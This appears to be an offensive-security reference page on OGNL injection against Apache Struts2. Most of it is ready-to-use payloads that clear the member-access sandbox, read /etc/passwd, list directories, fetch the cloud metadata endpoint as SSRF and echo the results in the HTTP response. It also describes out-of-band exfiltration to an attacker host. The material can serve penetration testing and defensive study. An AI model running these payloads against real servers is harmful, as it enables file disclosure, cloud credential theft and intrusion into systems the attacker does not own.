---
title: "OGNL remote file inclusion: reading and fetching through Struts2 expressions"
description: "OGNL constructs java.io.File and java.net.URL inside Struts2 evaluation to read local files and fetch remote content once the member-access sandbox is cleared."
keywords:
  - OGNL file read
  - OGNL remote file inclusion
  - java.net.URL openStream
  - Struts2 file disclosure
  - OGNL SSRF
---

# Remote file inclusion

Short of running a command, OGNL constructs I/O objects directly: `java.io.File` and its readers for local files, `java.net.URL` for remote fetches. The same member-access restriction that gates `Runtime` also gates these constructors on a modern stack, so the sandbox-clearing preamble from [remote code execution](remote-code-execution.md) comes first; on older or relaxed evaluators the constructor calls run on their own.

## Reading a local file

With member access restored, build a reader over a `File` and stream it into a token. A `BufferedReader` over a `FileReader` returns the contents line by line, and a `Scanner` with the `\A` delimiter returns the whole file at once:

```
%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,
new java.util.Scanner(new java.io.File("/etc/passwd")).useDelimiter("\\A").next()}
```

Reading a directory instead enumerates its entries, which pairs with the working directory recovered during the evaluation probe:

```
%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,
new java.io.File(".").list()}
```

## Fetching remote content

A `java.net.URL` opens an outbound stream from the server, which both includes remote content and reaches internal services the client cannot (an SSRF primitive against metadata endpoints and internal hosts):

```
%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,
new java.util.Scanner(new java.net.URL("http://169.254.169.254/latest/meta-data/").openStream()).useDelimiter("\\A").next()}
```

## Returning the content

To write either result to the client regardless of how the value stack handles it, pull the response from `ServletActionContext` and print the captured string, the same return path used for command output:

```
%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,
#data=new java.util.Scanner(new java.io.File("/etc/passwd")).useDelimiter("\\A").next(),
#resp=@org.apache.struts2.ServletActionContext@getResponse(),
#resp.getWriter().println(#data),
#resp.getWriter().flush()}
```

Writing out of band through `URL` to an attacker-controlled host exfiltrates the file content without needing the response body, by placing the read data into the query path of an outbound request, which is useful where the injection point discards its evaluation result.

## Tools

- **Burp Suite**: Repeater to construct File/URL reads inside OGNL and return content.
- **J2EEScan**: Burp extension flagging OGNL and Struts injection.
- Manual OGNL payloads building java.io.File and java.net.URL.

## References

- [Apache Commons OGNL Language Guide](https://commons.apache.org/proper/commons-ognl/language-guide.html)
- [Apache Struts2 Security](https://struts.apache.org/security/)
